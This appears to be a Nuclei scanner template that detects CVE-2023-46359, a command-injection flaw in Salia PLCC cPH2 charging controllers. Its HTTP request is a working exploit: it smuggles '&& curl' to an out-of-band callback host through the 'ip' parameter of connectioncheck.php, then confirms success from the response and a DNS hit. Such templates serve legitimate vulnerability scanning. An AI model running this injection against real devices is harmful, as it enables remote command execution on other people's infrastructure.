id: cve-2023-46359-rce
info:
  name: Salia PLCC cPH2 RCE (CVE-2023-46359)
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce,cve,cve-2023-46359
  description: |
    Remote Command Execution vulnerability in Salia PLCC cPH2. Exploits an unsanitized IP parameter to execute arbitrary commands via DNS exfiltration.
variables:
  domain: '{{interactsh-url}}'
http:
  - raw:
      - |
        GET /connectioncheck.php?ip=127.0.0.1%20%26%26%20curl%20http://{{domain}} HTTP/1.1
        Host: {{Hostname}}
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<b>SUCCESS</b>"
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
